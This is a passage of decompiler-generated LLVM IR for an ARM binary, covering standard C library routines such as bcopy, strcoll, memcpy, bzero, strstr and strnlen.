  br i1 %v2_11ad4, label %dec_label_pc_11ae4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11ad8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11ad8.pre to i8
  br label %bb

dec_label_pc_11ae4:                               ; preds = %.thread, %bb, %dec_label_pc_11acc
  %v0_11af028 = phi i32 [ %tmp, %dec_label_pc_11acc ], [ %v6_11ad8, %bb ], [ %v6_11ad8, %.thread ]
  %v0_11ae8.pr = phi i32 [ %v0_11ac4, %dec_label_pc_11acc ], [ %v0_11ae8.pr.pre, %bb ], [ %v2_11adc, %.thread ]
  %v0_11ae4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11ae4, i32* @ip, align 4
  %v8_11ae810 = icmp eq i32 %v0_11ae8.pr, 8
  store i1 %v8_11ae810, i1* %cpsr_z.global-to-local, align 1
  %v5_11aec11 = icmp slt i32 %v0_11ae8.pr, 8
  br i1 %v5_11aec11, label %dec_label_pc_11b28, label %dec_label_pc_11af0.preheader

dec_label_pc_11af0.preheader:                     ; preds = %dec_label_pc_11ae4
  %v1_11af046 = inttoptr i32 %v0_11af028 to i32*
  store i32 %v0_11ae4, i32* %v1_11af046, align 4
  %v3_11af047 = add i32 %v0_11af028, 4
  %v4_11af048 = inttoptr i32 %v3_11af047 to i32*
  %v5_11af049 = load i32, i32* @ip, align 4
  store i32 %v5_11af049, i32* %v4_11af048, align 4
  %v6_11af050 = add i32 %v0_11af028, 8
  store i32 %v6_11af050, i32* @r3, align 4
  %v0_11af451 = load i32, i32* @r2, align 4
  %v1_11af452 = add i32 %v0_11af451, -8
  store i32 %v1_11af452, i32* %r2.global-to-local, align 4
  %v5_11afc53 = icmp slt i32 %v1_11af452, 8
  br i1 %v5_11afc53, label %dec_label_pc_11af0.dec_label_pc_11b28.loopexit_crit_edge, label %dec_label_pc_11b00

dec_label_pc_11b00:                               ; preds = %dec_label_pc_11af0.preheader, %dec_label_pc_11ae8.dec_label_pc_11af0_crit_edge
  %v6_11af055 = phi i32 [ %v6_11af0, %dec_label_pc_11ae8.dec_label_pc_11af0_crit_edge ], [ %v6_11af050, %dec_label_pc_11af0.preheader ]
  %v0_11af054 = phi i32 [ %v12_11b1c, %dec_label_pc_11ae8.dec_label_pc_11af0_crit_edge ], [ %v0_11af028, %dec_label_pc_11af0.preheader ]
  %v1_11b00 = inttoptr i32 %v6_11af055 to i32*
  %v2_11b00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11b00, i32* %v1_11b00, align 4
  %v3_11b00 = add i32 %v0_11af054, 12
  %v4_11b00 = inttoptr i32 %v3_11b00 to i32*
  %v5_11b00 = load i32, i32* @ip, align 4
  store i32 %v5_11b00, i32* %v4_11b00, align 4
  %v6_11b00 = add i32 %v0_11af054, 16
  store i32 %v6_11b00, i32* @r3, align 4
  %v0_11b04 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b04 = add i32 %v0_11b04, -8
  store i32 %v1_11b04, i32* %r2.global-to-local, align 4
  %v5_11b0c = icmp slt i32 %v1_11b04, 8
  br i1 %v5_11b0c, label %dec_label_pc_11b00.dec_label_pc_11b28.loopexit_crit_edge, label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b00
  %v1_11b10 = inttoptr i32 %v6_11b00 to i32*
  %v2_11b10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11b10, i32* %v1_11b10, align 4
  %v3_11b10 = add i32 %v0_11af054, 20
  %v4_11b10 = inttoptr i32 %v3_11b10 to i32*
  %v5_11b10 = load i32, i32* @ip, align 4
  store i32 %v5_11b10, i32* %v4_11b10, align 4
  %v6_11b10 = add i32 %v0_11af054, 24
  store i32 %v6_11b10, i32* @r3, align 4
  %v0_11b14 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b14 = add i32 %v0_11b14, -8
  store i32 %v1_11b14, i32* %r2.global-to-local, align 4
  %v5_11b1c = icmp slt i32 %v1_11b14, 8
  br i1 %v5_11b1c, label %dec_label_pc_11b10.dec_label_pc_11b28.loopexit_crit_edge, label %dec_label_pc_11ae8

dec_label_pc_11ae8:                               ; preds = %dec_label_pc_11b10
  %v7_11b1c = inttoptr i32 %v6_11b10 to i32*
  %v8_11b1c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_11b1c, i32* %v7_11b1c, align 4
  %v9_11b1c = add i32 %v0_11af054, 28
  %v10_11b1c = inttoptr i32 %v9_11b1c to i32*
  %v11_11b1c = load i32, i32* @ip, align 4
  store i32 %v11_11b1c, i32* %v10_11b1c, align 4
  %v12_11b1c = add i32 %v0_11af054, 32
  store i32 %v12_11b1c, i32* @r3, align 4
  %v6_11b20 = load i32, i32* %r2.global-to-local, align 4
  %v7_11b20 = add i32 %v6_11b20, -8
  store i32 %v7_11b20, i32* %r2.global-to-local, align 4
  %v5_11aec = icmp slt i32 %v7_11b20, 8
  br i1 %v5_11aec, label %dec_label_pc_11ae8.dec_label_pc_11b28.loopexit_crit_edge, label %dec_label_pc_11ae8.dec_label_pc_11af0_crit_edge

dec_label_pc_11ae8.dec_label_pc_11af0_crit_edge:  ; preds = %dec_label_pc_11ae8
  %v2_11af0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11af0 = inttoptr i32 %v12_11b1c to i32*
  store i32 %v2_11af0.pre, i32* %v1_11af0, align 4
  %v3_11af0 = add i32 %v0_11af054, 36
  %v4_11af0 = inttoptr i32 %v3_11af0 to i32*
  %v5_11af0 = load i32, i32* @ip, align 4
  store i32 %v5_11af0, i32* %v4_11af0, align 4
  %v6_11af0 = add i32 %v0_11af054, 40
  store i32 %v6_11af0, i32* @r3, align 4
  %v0_11af4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11af4 = add i32 %v0_11af4, -8
  store i32 %v1_11af4, i32* %r2.global-to-local, align 4
  %v5_11afc = icmp slt i32 %v1_11af4, 8
  br i1 %v5_11afc, label %dec_label_pc_11af0.dec_label_pc_11b28.loopexit_crit_edge, label %dec_label_pc_11b00

dec_label_pc_11ae8.dec_label_pc_11b28.loopexit_crit_edge: ; preds = %dec_label_pc_11ae8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11b28

dec_label_pc_11af0.dec_label_pc_11b28.loopexit_crit_edge: ; preds = %dec_label_pc_11ae8.dec_label_pc_11af0_crit_edge, %dec_label_pc_11af0.preheader
  %v1_11af4.lcssa = phi i32 [ %v1_11af452, %dec_label_pc_11af0.preheader ], [ %v1_11af4, %dec_label_pc_11ae8.dec_label_pc_11af0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11b28

dec_label_pc_11b00.dec_label_pc_11b28.loopexit_crit_edge: ; preds = %dec_label_pc_11b00
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11b28

dec_label_pc_11b10.dec_label_pc_11b28.loopexit_crit_edge: ; preds = %dec_label_pc_11b10
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11b28

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11ae4, %dec_label_pc_11ae8.dec_label_pc_11b28.loopexit_crit_edge, %dec_label_pc_11af0.dec_label_pc_11b28.loopexit_crit_edge, %dec_label_pc_11b00.dec_label_pc_11b28.loopexit_crit_edge, %dec_label_pc_11b10.dec_label_pc_11b28.loopexit_crit_edge, %entry
  %v0_11b30 = phi i32 [ %v0_11ac4, %entry ], [ %v1_11b14, %dec_label_pc_11b10.dec_label_pc_11b28.loopexit_crit_edge ], [ %v1_11b04, %dec_label_pc_11b00.dec_label_pc_11b28.loopexit_crit_edge ], [ %v1_11af4.lcssa, %dec_label_pc_11af0.dec_label_pc_11b28.loopexit_crit_edge ], [ %v7_11b20, %dec_label_pc_11ae8.dec_label_pc_11b28.loopexit_crit_edge ], [ %v0_11ae8.pr, %dec_label_pc_11ae4 ]
  %v2_11b28 = icmp eq i32 %v0_11b30, 0
  store i1 %v2_11b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11b28, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11b28
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11b28
  %v1_11b30 = sub i32 7, %v0_11b30
  store i32 %v1_11b30, i32* %r2.global-to-local, align 4
  %v3_11b34 = mul i32 %v1_11b30, 4
  %v4_11b34 = add i32 %v3_11b34, ptrtoint (i32* @global_var_11b3c.688 to i32)
  call void @__pseudo_branch(i32 %v4_11b34)
  %v0_11b3c = load i32, i32* %r1.global-to-local, align 4
  %v1_11b3c = trunc i32 %v0_11b3c to i8
  %v2_11b3c = load i32, i32* @r3, align 4
  %v3_11b3c = inttoptr i32 %v2_11b3c to i8*
  store i8 %v1_11b3c, i8* %v3_11b3c, align 1
  %v4_11b3c = load i32, i32* @r3, align 4
  %v5_11b3c = add i32 %v4_11b3c, 1
  store i32 %v5_11b3c, i32* %r3.global-to-local, align 4
  %v0_11b40 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b40 = trunc i32 %v0_11b40 to i8
  %v3_11b40 = inttoptr i32 %v5_11b3c to i8*
  store i8 %v1_11b40, i8* %v3_11b40, align 1
  %v4_11b40 = load i32, i32* %r3.global-to-local, align 4
  %v5_11b40 = add i32 %v4_11b40, 1
  store i32 %v5_11b40, i32* %r3.global-to-local, align 4
  %v0_11b44 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b44 = trunc i32 %v0_11b44 to i8
  %v3_11b44 = inttoptr i32 %v5_11b40 to i8*
  store i8 %v1_11b44, i8* %v3_11b44, align 1
  %v4_11b44 = load i32, i32* %r3.global-to-local, align 4
  %v5_11b44 = add i32 %v4_11b44, 1
  store i32 %v5_11b44, i32* %r3.global-to-local, align 4
  %v0_11b48 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b48 = trunc i32 %v0_11b48 to i8
  %v3_11b48 = inttoptr i32 %v5_11b44 to i8*
  store i8 %v1_11b48, i8* %v3_11b48, align 1
  %v4_11b48 = load i32, i32* %r3.global-to-local, align 4
  %v5_11b48 = add i32 %v4_11b48, 1
  store i32 %v5_11b48, i32* %r3.global-to-local, align 4
  %v0_11b4c = load i32, i32* %r1.global-to-local, align 4
  %v1_11b4c = trunc i32 %v0_11b4c to i8
  %v3_11b4c = inttoptr i32 %v5_11b48 to i8*
  store i8 %v1_11b4c, i8* %v3_11b4c, align 1
  %v4_11b4c = load i32, i32* %r3.global-to-local, align 4
  %v5_11b4c = add i32 %v4_11b4c, 1
  store i32 %v5_11b4c, i32* %r3.global-to-local, align 4
  %v0_11b50 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b50 = trunc i32 %v0_11b50 to i8
  %v3_11b50 = inttoptr i32 %v5_11b4c to i8*
  store i8 %v1_11b50, i8* %v3_11b50, align 1
  %v4_11b50 = load i32, i32* %r3.global-to-local, align 4
  %v5_11b50 = add i32 %v4_11b50, 1
  store i32 %v5_11b50, i32* %r3.global-to-local, align 4
  %v0_11b54 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b54 = trunc i32 %v0_11b54 to i8
  %v3_11b54 = inttoptr i32 %v5_11b50 to i8*
  store i8 %v1_11b54, i8* %v3_11b54, align 1
  %v4_11b54 = load i32, i32* %r3.global-to-local, align 4
  %v5_11b54 = add i32 %v4_11b54, 1
  store i32 %v5_11b54, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11af0, { 1, 0 }
  uselistorder i32 %v12_11b1c, { 1, 2, 0 }
  uselistorder i32 %v0_11af054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11ae8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11ad8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_11acc, { 1, 0 }
  uselistorder i32 %v0_11ac4, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11b28, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11b00, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_11bcc = inttoptr i32 %arg2 to i8*
  %v3_11bcc = call i32 @_memcpy(i8* %v2_11bcc, i32 %arg1)
  ret i32 %v3_11bcc
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_11bd4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_11bd4 = phi i32 [ %v0_11bd4.pre, %bb ], [ %v5_11bd4, %bb3 ]
  %v0_11bd0 = phi i32 [ %tmp, %bb ], [ %v5_11bd0, %bb3 ]
  %v1_11bd0 = inttoptr i32 %v0_11bd0 to i8*
  %v2_11bd0 = load i8, i8* %v1_11bd0, align 1
  %v3_11bd0 = zext i8 %v2_11bd0 to i32
  store i32 %v3_11bd0, i32* @r2, align 4
  %v1_11bd4 = inttoptr i32 %v0_11bd4 to i8*
  %v2_11bd4 = load i8, i8* %v1_11bd4, align 1
  %v3_11bd4 = zext i8 %v2_11bd4 to i32
  %v2_11bd8 = icmp eq i8 %v2_11bd0, 0
  br i1 %v2_11bd8, label %.dec_label_pc_11be4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_11bd4 = add i32 %v0_11bd4, 1
  %v5_11bd0 = add i32 %v0_11bd0, 1
  %v10_11bdc = icmp eq i8 %v2_11bd0, %v2_11bd4
  br i1 %v10_11bdc, label %entry, label %dec_label_pc_11be4

.dec_label_pc_11be4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_11be4

dec_label_pc_11be4:                               ; preds = %bb3, %.dec_label_pc_11be4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_11be4_crit_edge ], [ %v3_11bd0, %bb3 ]
  %v2_11be4.pre-phi = sub nsw i32 %.pn, %v3_11bd4
  ret i32 %v2_11be4.pre-phi

; uselistorder directives
  uselistorder i32 %v0_11bd0, { 1, 0 }
  uselistorder i32 %v0_11bd4, { 1, 0 }
  uselistorder label %dec_label_pc_11be4, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11bf0 = load i32, i32* @r0, align 4
  %v1_11bf0 = load i32, i32* @r1, align 4
  %v2_11bf0 = inttoptr i32 %v0_11bf0 to i8*
  %v3_11bf0 = call i32 @_memcpy(i8* %v2_11bf0, i32 %v1_11bf0)
  ret i32 %v3_11bf0
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_11c08 = load i32, i32* @r0, align 4
  %v2_11c08 = inttoptr i32 %v0_11c08 to i8*
  %v3_11c08 = call i32 @__GI_memset(i8* %v2_11c08, i32 0)
  ret i32 %v3_11c08
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_11c14 = load i8, i8* %arg2, align 1
  %v2_11c18 = icmp eq i8 %v3_11c14, 0
  %v1_11d08.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_11c18, label %dec_label_pc_11d04, label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %entry
  %v1_11c20 = add i32 %v1_11d08.pre, -1
  store i32 %v1_11c20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11c24

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c30, %dec_label_pc_11c20
  %v0_11c24 = phi i32 [ %v1_11c24, %dec_label_pc_11c30 ], [ %v1_11c20, %dec_label_pc_11c20 ]
  %v1_11c24 = add i32 %v0_11c24, 1
  %v2_11c24 = inttoptr i32 %v1_11c24 to i8*
  %v3_11c24 = load i8, i8* %v2_11c24, align 1
  store i32 %v1_11c24, i32* %r0.global-to-local, align 4
  %v2_11c28 = icmp eq i8 %v3_11c24, 0
  br i1 %v2_11c28, label %dec_label_pc_11d00, label %dec_label_pc_11c30

dec_label_pc_11c30:                               ; preds = %dec_label_pc_11c24
  %v9_11c30 = icmp eq i8 %v3_11c24, %v3_11c14
  br i1 %v9_11c30, label %dec_label_pc_11c38, label %dec_label_pc_11c24

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11c30
  %v2_11c38 = add i32 %tmp, 1
  %v3_11c38 = inttoptr i32 %v2_11c38 to i8*
  %v4_11c38 = load i8, i8* %v3_11c38, align 1
  %v2_11c3c = icmp eq i8 %v4_11c38, 0
  br i1 %v2_11c3c, label %dec_label_pc_11d04, label %dec_label_pc_11c48

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c38
  %v1_11c48 = add i32 %v0_11c24, 2
  %v1_11c9c = add i32 %tmp, 2
  %v2_11c9c = inttoptr i32 %v1_11c9c to i8*
  br label %dec_label_pc_11c94

dec_label_pc_11c58:                               ; preds = %dec_label_pc_11cf4
  %v3_11c58 = load i8, i8* %v3_11c8c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11c84.preheader

dec_label_pc_11c84.preheader:                     ; preds = %dec_label_pc_11c58, %dec_label_pc_11c94
  %v0_11c843.in = phi i8 [ %v3_11c58, %dec_label_pc_11c58 ], [ %v3_11c8c.pn, %dec_label_pc_11c94 ]
  %v9_11c8412 = icmp eq i8 %v0_11c843.in, %v3_11c14
  br i1 %v9_11c8412, label %dec_label_pc_11c8c, label %dec_label_pc_11c64

dec_label_pc_11c64:                               ; preds = %dec_label_pc_11c84.preheader, %dec_label_pc_11c80
  %v0_11c6c = phi i32 [ %v1_11c80, %dec_label_pc_11c80 ], [ %storemerge41, %dec_label_pc_11c84.preheader ]
  %v0_11c64.in = phi i8 [ %v3_11c80, %dec_label_pc_11c80 ], [ %v0_11c843.in, %dec_label_pc_11c84.preheader ]
  %v2_11c64 = icmp eq i8 %v0_11c64.in, 0
  br i1 %v2_11c64, label %dec_label_pc_11d00, label %dec_label_pc_11c6c

dec_label_pc_11c6c:                               ; preds = %dec_label_pc_11c64
  %v1_11c6c = add i32 %v0_11c6c, 1
  %v2_11c6c = inttoptr i32 %v1_11c6c to i8*
  %v3_11c6c = load i8, i8* %v2_11c6c, align 1
  store i32 %v1_11c6c, i32* %r0.global-to-local, align 4
  %v9_11c70 = icmp eq i8 %v3_11c6c, %v3_11c14
  br i1 %v9_11c70, label %dec_label_pc_11c8c, label %dec_label_pc_11c78

dec_label_pc_11c78:                               ; preds = %dec_label_pc_11c6c
  %v2_11c78 = icmp eq i8 %v3_11c6c, 0
  br i1 %v2_11c78, label %dec_label_pc_11d00, label %dec_label_pc_11c80

dec_label_pc_11c80:                               ; preds = %dec_label_pc_11c78
  %v1_11c80 = add i32 %v0_11c6c, 2
  %v2_11c80 = inttoptr i32 %v1_11c80 to i8*
  %v3_11c80 = load i8, i8* %v2_11c80, align 1
  store i32 %v1_11c80, i32* %r0.global-to-local, align 4
  %v9_11c84 = icmp eq i8 %v3_11c80, %v3_11c14
  br i1 %v9_11c84, label %dec_label_pc_11c8c, label %dec_label_pc_11c64

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11c6c, %dec_label_pc_11c80, %dec_label_pc_11c84.preheader
  %v0_11c8c = phi i32 [ %storemerge41, %dec_label_pc_11c84.preheader ], [ %v1_11c6c, %dec_label_pc_11c6c ], [ %v1_11c80, %dec_label_pc_11c80 ]
  %v1_11c8c = add i32 %v0_11c8c, 1
  br label %dec_label_pc_11c94

dec_label_pc_11c94:                               ; preds = %dec_label_pc_11c48, %dec_label_pc_11c8c
  %storemerge41 = phi i32 [ %v1_11c8c, %dec_label_pc_11c8c ], [ %v1_11c48, %dec_label_pc_11c48 ]
  %v3_11c8c.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_11c8c.pn = load i8, i8* %v3_11c8c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_11c8c.pn, %v4_11c38
  br i1 %storemerge, label %dec_label_pc_11c98, label %dec_label_pc_11c84.preheader

dec_label_pc_11c98:                               ; preds = %dec_label_pc_11c94
  %v1_11c98 = add i32 %storemerge41, 1
  %v2_11c98 = inttoptr i32 %v1_11c98 to i8*
  %v3_11c98 = load i8, i8* %v2_11c98, align 1
  %v4_11c98 = zext i8 %v3_11c98 to i32
  %v3_11c9c = load i8, i8* %v2_11c9c, align 1
  %v4_11c9c = zext i8 %v3_11c9c to i32
  %v9_11ca4 = icmp eq i8 %v3_11c98, %v3_11c9c
  %v1_11cac = add i32 %storemerge41, -1
  store i32 %v1_11cac, i32* %r0.global-to-local, align 4
  br i1 %v9_11ca4, label %dec_label_pc_11cb4, label %dec_label_pc_11cf4

dec_label_pc_11cb4:                               ; preds = %dec_label_pc_11c98, %dec_label_pc_11ce4
  %v0_11ccc = phi i32 [ %v1_11cd4, %dec_label_pc_11ce4 ], [ %v1_11c9c, %dec_label_pc_11c98 ]
  %v0_11cc4 = phi i32 [ %v1_11cd0, %dec_label_pc_11ce4 ], [ %v1_11c98, %dec_label_pc_11c98 ]
  %v0_11cb4 = phi i32 [ %v4_11ce4, %dec_label_pc_11ce4 ], [ %v4_11c98, %dec_label_pc_11c98 ]
  %v2_11cb4 = icmp eq i32 %v0_11cb4, 0
  br i1 %v2_11cb4, label %dec_label_pc_11d04, label %dec_label_pc_11cbc

dec_label_pc_11cbc:                               ; preds = %dec_label_pc_11cb4
  %v1_11cbc = add i32 %v0_11cc4, 1
  %v2_11cbc = inttoptr i32 %v1_11cbc to i8*
  %v3_11cbc = load i8, i8* %v2_11cbc, align 1
  %v1_11cc0 = add i32 %v0_11ccc, 1
  %v2_11cc0 = inttoptr i32 %v1_11cc0 to i8*
  %v3_11cc0 = load i8, i8* %v2_11cc0, align 1
  %v4_11cc0 = zext i8 %v3_11cc0 to i32
  store i32 %v1_11cbc, i32* @r1, align 4
  %v9_11cc8 = icmp eq i8 %v3_11cbc, %v3_11cc0
  %v1_11cd0 = add i32 %v0_11cc4, 2
  %v1_11cd4 = add i32 %v0_11ccc, 2
  br i1 %v9_11cc8, label %dec_label_pc_11cdc, label %dec_label_pc_11cf4

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cbc
  %v2_11cdc = icmp eq i8 %v3_11cbc, 0
  br i1 %v2_11cdc, label %dec_label_pc_11d04, label %dec_label_pc_11ce4

dec_label_pc_11ce4:                               ; preds = %dec_label_pc_11cdc
  %v2_11ce4 = inttoptr i32 %v1_11cd4 to i8*
  %v3_11ce4 = load i8, i8* %v2_11ce4, align 1
  %v4_11ce4 = zext i8 %v3_11ce4 to i32
  %v2_11ce8 = inttoptr i32 %v1_11cd0 to i8*
  %v3_11ce8 = load i8, i8* %v2_11ce8, align 1
  %v9_11cec = icmp eq i8 %v3_11ce8, %v3_11ce4
  br i1 %v9_11cec, label %dec_label_pc_11cb4, label %dec_label_pc_11cf4

dec_label_pc_11cf4:                               ; preds = %dec_label_pc_11ce4, %dec_label_pc_11cbc, %dec_label_pc_11c98
  %v0_11cf4 = phi i32 [ %v4_11c9c, %dec_label_pc_11c98 ], [ %v4_11ce4, %dec_label_pc_11ce4 ], [ %v4_11cc0, %dec_label_pc_11cbc ]
  %v2_11cf4 = icmp eq i32 %v0_11cf4, 0
  br i1 %v2_11cf4, label %dec_label_pc_11d04, label %dec_label_pc_11c58

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11c24, %dec_label_pc_11c78, %dec_label_pc_11c64
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d04

dec_label_pc_11d04:                               ; preds = %dec_label_pc_11cf4, %dec_label_pc_11cdc, %dec_label_pc_11cb4, %entry, %dec_label_pc_11c38, %dec_label_pc_11d00
  %v1_11d08 = phi i32 [ %v1_11c24, %dec_label_pc_11c38 ], [ 0, %dec_label_pc_11d00 ], [ %v1_11d08.pre, %entry ], [ %v1_11cac, %dec_label_pc_11cb4 ], [ %v1_11cac, %dec_label_pc_11cdc ], [ %v1_11cac, %dec_label_pc_11cf4 ]
  ret i32 %v1_11d08

; uselistorder directives
  uselistorder i32 %v1_11cd0, { 1, 0 }
  uselistorder i8 %v3_11c8c.pn, { 1, 0 }
  uselistorder i8* %v3_11c8c.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_11c80, { 1, 0 }
  uselistorder i32 %v1_11c80, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11c24, { 0, 2, 3, 1 }
  uselistorder i8 %v3_11c14, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 9, 5, 6, 3, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_11d04, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_11d00, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11cb4, { 1, 0 }
  uselistorder label %dec_label_pc_11c94, { 1, 0 }
  uselistorder label %dec_label_pc_11c8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11c64, { 1, 0 }
  uselistorder label %dec_label_pc_11c84.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11d0c = icmp eq i32 %arg2, 0
  br i1 %v2_11d0c, label %bb, label %dec_label_pc_11d20

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_11d20:                               ; preds = %entry
  %v2_11d20 = add i32 %tmp, %arg2
  %v3_11d20 = icmp ult i32 %v2_11d20, %tmp
  br i1 %v3_11d20, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_11d20
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_11d20, %bb19
  %v5_11dc0 = phi i32 [ %v2_11d20, %dec_label_pc_11d20 ], [ -1, %bb19 ]
  %v1_11d404 = urem i32 %tmp, 4
  %v2_11d405 = icmp eq i32 %v1_11d404, 0
  br i1 %v2_11d405, label %dec_label_pc_11d48, label %dec_label_pc_11d30

dec_label_pc_11d30:                               ; preds = %bb20, %dec_label_pc_11d3c
  %v0_11d3c = phi i32 [ %v1_11d3c, %dec_label_pc_11d3c ], [ %tmp, %bb20 ]
  %v1_11d30 = inttoptr i32 %v0_11d3c to i8*
  %v2_11d30 = load i8, i8* %v1_11d30, align 1
  %v2_11d34 = icmp eq i8 %v2_11d30, 0
  br i1 %v2_11d34, label %dec_label_pc_11dbc, label %dec_label_pc_11d3c

dec_label_pc_11d3c:                               ; preds = %dec_label_pc_11d30
  %v1_11d3c = add i32 %v0_11d3c, 1
  %v1_11d40 = urem i32 %v1_11d3c, 4
  %v2_11d40 = icmp eq i32 %v1_11d40, 0
  br i1 %v2_11d40, label %dec_label_pc_11d48, label %dec_label_pc_11d30

dec_label_pc_11d48:                               ; preds = %dec_label_pc_11d3c, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_11d3c, %dec_label_pc_11d3c ]
  %v3_11dac30 = icmp ult i32 %storemerge.lcssa, %v5_11dc0
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_11dac30, label %dec_label_pc_11d50, label %dec_label_pc_11dbc

dec_label_pc_11d50:                               ; preds = %dec_label_pc_11da8, %dec_label_pc_11d48
  %v0_11da037 = phi i32 [ %v4_11d50, %dec_label_pc_11da8 ], [ %storemerge.lcssa, %dec_label_pc_11d48 ]
  %v1_11d50 = inttoptr i32 %v0_11da037 to i32*
  %v2_11d50 = load i32, i32* %v1_11d50, align 4
  %v4_11d50 = add i32 %v0_11da037, 4
  %v2_11d54 = add i32 %v2_11d50, -16843009
  %v2_11d58 = and i32 %v2_11d54, -2139062144
  store i32 %v2_11d58, i32* @ip, align 4
  %v2_11d5c = icmp eq i32 %v2_11d58, 0
  br i1 %v2_11d5c, label %dec_label_pc_11da8, label %dec_label_pc_11d64

dec_label_pc_11d64:                               ; preds = %dec_label_pc_11d50
  %v2_11d64 = inttoptr i32 %v0_11da037 to i8*
  %v3_11d64 = load i8, i8* %v2_11d64, align 1
  %v2_11d68 = icmp eq i8 %v3_11d64, 0
  br i1 %v2_11d68, label %bb21, label %dec_label_pc_11d78

bb21:                                             ; preds = %dec_label_pc_11d64
  br label %dec_label_pc_11dbc

dec_label_pc_11d78:                               ; preds = %dec_label_pc_11d64
  %v1_11d78 = add i32 %v0_11da037, 1
  %v2_11d78 = inttoptr i32 %v1_11d78 to i8*
  %v3_11d78 = load i8, i8* %v2_11d78, align 1
  %v2_11d7c = icmp eq i8 %v3_11d78, 0
  br i1 %v2_11d7c, label %dec_label_pc_11dbc, label %dec_label_pc_11d88

dec_label_pc_11d88:                               ; preds = %dec_label_pc_11d78
  %v1_11d88 = add i32 %v0_11da037, 2
  %v2_11d88 = inttoptr i32 %v1_11d88 to i8*
